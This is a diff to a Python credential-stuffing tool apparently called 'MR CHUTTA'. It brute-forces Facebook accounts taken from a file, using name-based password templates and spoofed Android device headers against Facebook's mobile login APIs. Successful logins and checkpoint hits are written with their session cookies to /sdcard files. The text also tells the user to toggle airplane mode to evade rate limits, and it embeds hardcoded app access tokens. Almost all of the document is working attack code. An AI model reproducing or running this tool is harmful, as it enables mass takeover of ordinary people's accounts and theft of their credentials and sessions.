@@ -1,6 +1,5 @@
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FULL SCRIPT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 # OWNER BY SCRIPT : MR CHUTTA
-# MAKE BY : FARDIN AHMED ASHRAFUL
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 from os import path
 from urllib.request import urlopen
@@ -219,14 +218,14 @@ logo=f"""\x1b[38;5;46m ▗▖  ▗▖▗▄▄▖      ▗▄▄▖▗▖ ▗▖
 \x1b[38;5;46m ▐▌  ▐▌▐▌ ▐▌    ▝▚▄▄▖▐▌ ▐▌▝▚▄▞▘  █    █ ▐▌ ▐▌
 {R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {A}[{R}●{A}] {G}FACEBOOK   {R} >>   {A}MR CHUTTA
-{A}[{R}●{A}] {G}STATUS      {R}>>   {A}FILE {R}X{A} RANDOM
+{A}[{R}●{A}] {G}STATUS      {R}>>   {A}FILE {R}x{A}ONLY
 {A}[{R}●{A}] {G}VERSION   {R}  >>   {A}0.1
 {A}[{R}●{A}] {G}TOOL    {R}  >>   {A}PERSONAL
 {R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 def menu():
         try:                        
-                        clear();print(f'{A}[{R}1{A}] {G}FILE CRACK\n{A}[{R}2{A}] {G}RANDOM CRACK\n{A}[{R}3{A}] {G}JOINT PUBLIC GROUP \n{A}[{R}4{A}] {G}EXIT')
+                        clear();print(f'{A}[{R}1{A}] {G}FILE CRACK\n{A}[{A}{R}2{A}] {G}EXIT')
                         linex()
                         CHUTTA=input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A} ')
                         if CHUTTA in ['1','01']:
@@ -273,7 +272,7 @@ def menu():
                                 with tred(max_workers=30) as crack_submit:
                                         clear()
                                         total_ids = str(len(fo))
-                                        #print(f"{A}[{R}●{A}] {G}USERNAME{R} : {purple}{bal}{A}-{purple}{purple}{bit}");print(f"{A}[{R}●{A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}●{A}]{G} SIM NAME  {R}>> {A}{sim} ')
+                                        print(f"{A}[{R}●{A}] {G}USERNAME{R} : {blue}{bal}{A}-{blue}{green}{bit}");print(f'{A}[{R}●{A}]{G} SIM NAME  {R}>> {A}{sim} ')
                                         print(f'{A}[{R}●{A}] {G}TOTAL ID {R} >>{A} {total_ids} {R} >> {G}CRACKING METHOD {R} >>{A} M{mthd}')                                   
                                         print(f'{A}[{R}●{A}] {G}TURN ON/OF AIRPLAN MODE EVERY 5 MIN')
                                         linex()
@@ -283,7 +282,7 @@ def menu():
                                                 if mthd in ['1','01']:
                                                         crack_submit.submit(api1,ids,names,passlist)
                                                 elif mthd in ['2','02']:
-                                                        crack_submit.submit(api2,ids,names,passlist)
+                                                        crack_submit.submit(m2,ids,names,passlist)
                                                 elif mthd in ['3','03']:
                                                         crack_submit.submit(api3,ids,names,passlist)
                                                 elif mthd in ['4','04']:
@@ -311,116 +310,193 @@ def menu():
                 exit()
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 def api1(ids,names,passlist):
-    global loop,oks,cps
-    sys.stdout.write(f"\r\r{R}[{G}CHUTTA-M1{R}] >> {R}[{A}{loop}{R}]{R} >> {R}[{G}OK{A}•{G}{len(oks)}{R}]");sys.stdout.flush()
-    sys.stdout.flush()
-    ua  = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/279865282;FBCR/Airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
-    try:
-        fn = names.split(' ')[0]
         try:
-            ln = names.split(' ')[1]
-        except:
-            ln = fn
-        for pw in passlist:
-            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
-            data = {
-            "adid": str(uuid.uuid4()),
-            "format": "json",
-            "device_id": str(uuid.uuid4()),
-            "cpl": "true",
-            "family_device_id": str(uuid.uuid4()),
-            "credentials_type": "device_based_login_password",
-            "error_detail_type": "button_with_disabled",
-            "source": "device_based_login",
-            "email": ids,
-            "password": pas,
-            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-            "generate_session_cookies": "1",
-            "meta_inf_fbmeta": "",
-            "advertiser_id": str(uuid.uuid4()),
-            "currently_logged_in_userid": "0",
-            "locale": "en_GB",
-            "client_country_code": "GB",
-            "method": "auth.login",
-            "fb_api_req_friendly_name": "authenticate",
-            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-            "api_key": "882a8490361da98702bf97a021ddc14d"}
-            head = {
-            'User-Agent': UA(),
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Host': 'graph.facebook.com',
-            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-            'X-FB-Connection-Type': 'MOBILE.LTE',
-            'X-Tigon-Is-Retry': 'False',
-            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-            'X-fb-device-group': '5120',
-            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags': 'graphservice',
-            'X-FB-HTTP-Engine': 'Liger',
-            'X-FB-Client-IP': 'True',
-            'X-FB-Server-Cluster': 'True',
-            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-            url = "https://b-graph.facebook.com/auth/login"
-            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
-            if "access_token" in po:
-                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                print(f'\r\r\x1b[38;5;46m{A}[{G}CHUTTA-OK{A}]{G} '+ids+f' {R}•{G} '+pas+'')
-                CHUTTA = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{CHUTTA} {coki}")
-                open('/sdcard/CHUTTA-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
-                oks.append(ids)
-                break
-            elif 'www.facebook.com' in po['error']['message']:
-                print(f'\r\r{R}[CHUTTA-CP{R}] '+ids+f' | '+pas+'')
-                open('/sdcard/CHUTTA-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
-                cps.append(ids)
-                break
-            else:continue
-        loop+=1
-    except Exception as e:
-        pass
+                global ok,loop,sim_id
+                sys.stdout.write('\r\r\033[1;37m [CHUTTA-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                fn = names.split(' ')[0]
+                try:
+                        ln = names.split(' ')[1]
+                except:
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        en = random.choice(['en_US','en_GB'])
+                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
+                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
+                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/196.0.0.61;FBBV/787895399;FBDM/{density=1.5,width=720,height=1280};FBLC/en_IN;FBRV/387109426;FBCR/Personal;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/23116PN5BC;FBSV/14.0;nullFBCA/armeabi-v7a:armeabi;]"
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {'adid': adid,
+'format': 'json',
+'device_id': str(uuid.uuid4()),
+'family_device_id': str(uuid.uuid4()),
+'secure_family_device_id': str(uuid.uuid4()),
+'cpl': 'true',
+'try_num': '1',
+'email': ids,
+'password': pas,
+'method': 'auth.login',
+'generate_analytics_claim':'1',
+'community_id':'',
+'cpl':'true',
+'try_num':'1',
+'sim_serials': "['80973453345210784798']",
+'openid_flow': 'android_login',
+'openid_provider': 'google',
+'openid_emails': "['01710940017']",
+'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
+'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3',
+'fb4a_shared_phone_cpl_group':'enable_v3_at_risk',
+'enroll_misauth':'false',
+'generate_session_cookies':'1',
+'error_detail_type':'button_with_disabled',
+'source':'account_recovery',
+'generate_machine_id':'1',
+'jazoest':'2980',
+'meta_inf_fbmeta':'V2_UNTAGGED',
+'encrypted_msisdn':'',
+'currently_logged_in_userid':'0',
+'locale': 'en_US',
+'client_country_code': 'US',
+'fb_api_req_friendly_name':'autheticate',
+'fb_api_caller_class':'Fb4aAuthHandler',
+'api_key':'882a8490361da98702bf97a021ddc14d',
+'access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
+'sig':'4c854da0db9429f4913c2a1b221c1d30'}
+                        headers={'Host': 'graph.facebook.com',
+'Content-Type': 'application/x-www-form-urlencoded',
+'Accept-Encoding': 'gzip, deflate',
+'Connection': 'keep-alive',
+'POST': '/auth/login HTTP/2',
+'Host': 'b-graph.facebook.com',
+'Priority': 'u=3, i',
+'Content-Type': 'application/x-www-form-urlencoded',
+'X-Fb-Sim-Hni': '64301',
+'X-Fb-Net-Hni': '64301',
+'X-Fb-Connection-Quality': 'EXCELLENT',
+'Zero-Rated': '0',
+'User-Agent': ua,
+'X-Fb-Connection-Quality': 'EXCELLENT',
+'Authorization': 'OAuth null',
+'X-Fb-Connection-Bandwidth': '24807555',
+'X-Fb-Connection-Type': 'MOBILE.LTE',
+'X-Fb-Device-Group': '6060',
+'X-Tigon-Is-Retry': 'False',
+'X-Fb-Friendly-Name': 'authenticate',
+'X-Fb-Request-Analytics-Tags': 'unknown',
+'X-Fb-Http-Engine': 'Liger',
+'X-Fb-Client-Ip': 'True',
+'X-Fb-Server-Cluster': 'True',
+'Content-Length': '2126'}
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                        print('\r\r\033[1;32m [CHUTTA-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                                        coki = f"sb={compile_coki};{get_coki}"
+                                        #print("\r\r\033[1;33m Cookie: "+coki)
+                                        open('/sdcard/CHUTTA-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
+                                        open('/sdcard/CHUTTA-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        oks.append(ids)
+                                        break
+                        elif twf in str(po):
+                                        if 'y' in pcp:
+                                                print('\r\r \033[1;34m[CHUTTA-2F] '+ids+' | '+pas)
+                                                twf.append(ids)
+                                                break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print('\r\r\x1b[1;31m\r\r [CHUTTA-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/CHUTTA-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                                        else:
+                                                open('/sdcard/CHUTTA-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                        else:
+                                        continue
+                loop+=1
+        except requests.exceptions.ConnectionError:
+                time.sleep(5)
+                api3(ids,names,passlist)
+        except Exception as e:
+                pass
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
-def api2(ids,names,passlist):
-	try:
-		global ok,loop,sim_id
-		sys.stdout.write('\r\r\033[1;37m [CHUTTA-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-		ses = requests.Session()
-		fn = names.split(' ')[0]
-		try:
-			ln = names.split(' ')[1]
-		except:
-			ln = fn
-		for pw in passlist:
-			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			ua = random.choice(ugen)
-			ses = requests.Session()
-			url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=114593902037957&kid_directed_site=0&app_id=114593902037957&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D114593902037957%26cbt%3D1701088365087%26channel_url%3Dhttps%253A%252F%252Fstaticxm.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3cab5fd61e0304%2526domain%253Dpixabay.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpixabay.com%25252Ff35533a5a42b844%2526relation%253Dopener%26client_id%3D114593902037957%26display%3Dtouch%26domain%3Dpixabay.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpixabay.com%252Fphotos%252F%26locale%3Den_US%26logger_id%3Df2534d0c16a119%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxm.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df284c1bec159d1%2526domain%253Dpixabay.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpixabay.com%25252Ff35533a5a42b844%2526relation%253Dopener%2526frame%253Df3ef3d0493a9da%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxm.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df284c1bec159d1%26domain%3Dpixabay.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpixabay.com%252Ff35533a5a42b844%26relation%3Dopener%26frame%3Df3ef3d0493a9da%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en&pl_dbl=0&refsrc=deprecated&_rdr"
-			head1 = {'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'com.facebook.katana', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://m.facebook.com/', 'accept-encoding': 'gzip, deflate br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
-			link = ses.get(url,headers=head1)
-			data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'true', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1), 'encpass':'#PWD_BROWSER:0:%s:%s'%(re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),pas), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1), '__dyn': '', '__csr': '', '__req': 'h', '__a': '', '__user': '0', '_fb_noscript': 'true'}
-			yusup = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
-			head = {'authority': 'm.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'en-US;q=0.9,en;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '3.02348', 'origin': 'https://m.facebook.com', 'referer': url, 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"', 'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent':ua, 'viewport-width': '891', 'x-asbd-id': '129477', 'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1)}
-			ses.post(f'https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',headers=head,data=data,cookies={'cookie': yusup},proxies=prox(),allow_redirects=False)
-			if "checkpoint" in str(ses.cookies.get_dict()):
-				print('\r\r\033[1;91m [CHUTTA-CP] '+ids+' | '+pas)
-				open('/sdcard/CHUTTA-CP.txt','a').write(ids+'|'+pas+'\n')
-				cps.append(ids)
-				break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
-				print('\r\r\033[1;92m [CHUTTA-OK] '+ids+' | '+pas+'\033[1;37m')
-				open('/sdcard/CHUTTA-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
-				open('/sdcard/CHUTTA-OK.txt','a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			else:
-				continue
-		loop+=1
-	except requests.exceptions.ConnectionError:
-		time.sleep(5)
-		api4(ids,names,passlist)
-	except Exception as e:pass
+def m2(ids,names,passlist):
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r\033[1;37m [CHUTTA-M2] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        session = requests.Session()
+        try:
+                first = names.split(f' ')[0]
+                try:
+                        last = names.split(f' ')[1]
+                except:
+                        last = 'khan'
+                ps = first.lower()
+                ps2 = last.lower()
+                for fikr in passlist:
+               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
+                        ua=random.choice(ugen)
+                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        KRRSS=session.cookies.get_dict().keys()
+                        if "c_user" in KRRSS:
+                                print(f'\r\r\033[1;32m [CHUTTA\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
+                                cook = session.cookies.get_dict()
+                                cookie = "; ".join([f"{key}={value}" for key, value in cook.items()])
+                                open(f'/sdcard/CHUTTA-COOKIE.txt', 'a').write(ids+' | '+pas+' | '+cookie+'\n')
+                                open('/sdcard/CHUTTA-OK.txt','a').write(ids+'|'+pas+'\n')
+                                oks.append(ids)
+                                break
+                        
+                        elif 'checkpoint' in KRRSS:
+                                if 'y' in krk:
+                                        print(f'\r\r\033[1;91m [CHUTTA-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/CHUTTA-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        cps.append(ids)
+                                        break
+                                else:
+                                        break
+                        else:
+                                continue
+        except requests.exceptions.ConnectionError:
+                time.sleep(20)
+        loop+=1
+	
 #▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M3 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
 def api3(ids,names,passlist):
         try:
@@ -497,7 +573,7 @@ def api3(ids,names,passlist):
 'Priority': 'u=3, i',
 'X-Fb-Sim-Hni': '45204',
 'X-Fb-Net-Hni': '45201',
-'X-Fb-Connection-Quality': 'GOOD',
+'X-Fb-Connection-Quality': 'EXCELLENT',
 'Zero-Rated': '0',
 'User-Agent': ua,
 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
@@ -547,193 +623,5 @@ def api3(ids,names,passlist):
                 api3(ids,names,passlist)
         except Exception as e:
                 pass
-#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ RANDOM ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#     
-def ___RANDOM___():
-    clear()
-    print(f'{red}[{white}A{red}]{green} BD RANDOM ')
-    print(f'{red}[{white}B{red}]{green} INDIA RANDOM')
-    print(f'{red}[{white}C{red}]{green} MALAYSIA RANDOM')
-    print(f'{red}[{white}D{red}]{green} PAKISTAN RANDOM')
-    print(f'{red}[{white}E{red}]{green} NEPAL RANDOM')
-    print(f'{red}[{white}F{red}]{green} PHILIPPINES RANDOM')
-    print(f'{red}[{white}G{red}]{green} BACK MENU')
-    linex()
-    error_ = input(f'{red}[{white}◆{red}]{green} Selection {white}▶ {yellow}︎')
-    if error_ in ['A','a','01','1']:___BD___()
-    elif error_ in ['B','b','02','2']:___INDIA___()
-    elif error_ in ['C','c','03','3']:___ML___()
-    elif error_ in ['D','d','04','4']:___PK___()
-    elif error_ in ['E','e','05','5']:___NP___()
-    elif error_ in ['F','f','06','6']:___PH___()
-    elif error_ in ['G','g','07','7']:menu()
-    else:___RANDOM___()
-
-def ___BD___():
-    clear()
-    print(f'{red}[{green}◆{red}] {green}SIM CODES {white}▶︎ {red}[{white}018 017 016 013{red}]');linex()
-    code = input(f'{red}[{green}◆{red}]{green} Choice    {white}▶︎ {yellow}')
-    clear()
-    print(f'{red}[{green}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');linex()
-    limit = int(input(f'{red}[{green}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
-    linex()
-    plist = []
-    clear()
-    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");linex()
-    mtd=input(f"\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37m▶︎ \x1b[38;5;208m")
-    clear()
-    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
-    print(f"\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");linex()
-    __CH__ = input(f"\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37m▶︎ \x1b[38;5;208m")
-    if __CH__ in ["A","a","1"]:
-        plist.append('first6')
-        plist.append('last6')
-        plist.append('first7')
-        plist.append('last7')
-        plist.append('first8')
-        plist.append('last8')
-        plist.append('last11')
-        plist.append('@1234@')
-        plist.append('@12345@')
-        plist.append('@123456@')
-        plist.append('@1234567@')
-        plist.append('@@@@####')
-        plist.append('@#@#@#')
-        plist.append('708090')
-        plist.append('506060')
-        plist.append('203040')
-        plist.append('102030')
-        
-    elif __CH__ in ["B","b","2"]:
-        clear()
-        psl = int(input(f'{red}[{white}➤{red}] {green}INPUT PASS LIMITS {white}▶︎ {red}'));linex()
-        print(f"{red}[{white}➤{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8{red}]")
-        linex()
-        for i in range(psl):
